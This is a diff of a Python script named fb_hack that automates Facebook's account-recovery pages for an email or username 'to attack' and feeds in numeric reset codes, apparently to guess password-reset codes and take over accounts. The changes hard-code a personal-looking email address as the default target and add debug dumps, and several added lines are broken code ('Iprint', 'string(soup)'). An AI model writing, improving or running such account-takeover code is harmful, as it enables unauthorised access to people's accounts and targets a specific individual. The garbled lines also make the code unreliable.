@@ -68,11 +68,13 @@ def fb_hack(email, codex):
   try:
     browser.select_form(nr=0)
   except:
-    print(browser.geturl())
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
+    print("1")
     with open("output1.html", "w") as file:
       file.write(str(soup))
+    print(browser.geturl())
+    print(browser.find_link())
     sys.exit()
   browser.form['email'] = email
   browser.submit()
@@ -84,29 +86,30 @@ def fb_hack(email, codex):
     print(browser.geturl())
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
-    print(soup.find(string("Facebook is not available on this browser")))
     with open("output2.html", "w") as file:
       file.write(str(soup))
+    print("2")
     sys.exit()
   try:
     browser.select_form(nr=0)
     browser.submit()
   except:
-    print(browser.geturl())
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     with open("output3.html", "w") as file:
-      file.write(unicode(soup))
+      file.write(string(soup))
+    print("3")
     sys.exit()
   try:
     browser.select_form(nr=0)
     browser.submit()
   except:
-    print(browser.geturl())
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
+    Iprint(soup.find(string("Facebook is not available on this browser")))
     with open("output4.html", "w") as file:
       file.write(str(soup))
+    print("4")
     sys.exit()
   """reset code input"""
   y = int(codex)
@@ -204,16 +207,7 @@ def fb_hack(email, codex):
 
 os.system('clear')
 passcode6()
-f = open("emails.txt", "r")
-ehack = input('Email address or username to attack:') or f.readlines(-1)
-f.close()
-reset = int(input('Code: ') or 1)
-reset1 = reset
-f = open("emails.txt", "a")
-z = open("passcoder.txt", "a")
-f.write(ehack)
-f.close()
-z.write(str(reset1))
-z.close()
 
+ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
+reset = int(input('Code: ') or 99999999)
 fb_hack(ehack, reset)
